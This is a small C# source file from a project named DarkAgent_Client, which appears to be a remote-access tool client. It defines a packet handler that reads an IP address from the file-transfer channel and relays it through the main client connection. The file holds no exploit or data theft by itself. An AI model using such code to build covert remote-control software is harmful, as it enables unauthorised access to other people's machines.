using System;
using System.Collections.Generic;
using System.Text;
using DarkAgent_Client.src.Network.DataNetwork.Packets.Send;

namespace DarkAgent_Client.src.Network.FileNetwork.Packets.Receive
{
    class R_RemoteIP : ReceiveBasePacket
    {
        public R_RemoteIP(FileTransferConnect client, byte[] packet)
            : base(client, packet)
        {
        }

        string ip;
        public override void Read()
        {
            ip = ReadString();
        }

        public override void Run()
        {
            Program.Client.SendPacket(new S_RemoteIP(Program.Client, ip));
        }
    }
}
